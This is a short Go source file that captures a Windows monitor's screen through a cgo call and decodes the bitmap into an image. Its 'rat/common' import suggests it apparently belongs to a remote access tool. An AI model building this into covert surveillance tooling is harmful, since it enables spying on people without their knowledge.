package screen

/*
#cgo LDFLAGS: -lGdi32 -lgdiplus
#include <windows.h>
#include "screen.h"
*/
import "C"

import (
	"bytes"
	"fmt"
	"image"
	"rat/common"
	"unsafe"

	"golang.org/x/image/bmp"
)

func Capture(monitor common.Monitor) image.Image {
	m := cMonitor(monitor)

	var len C.int

	buf := C.GetScreenshot(m, &len)

	buf1 := C.GoBytes(unsafe.Pointer(buf), len)

	img, err := bmp.Decode(bytes.NewReader(buf1))

	C.free(unsafe.Pointer(buf))

	if err != nil {
		fmt.Println(err.Error())
		return nil
	}

	return img
}
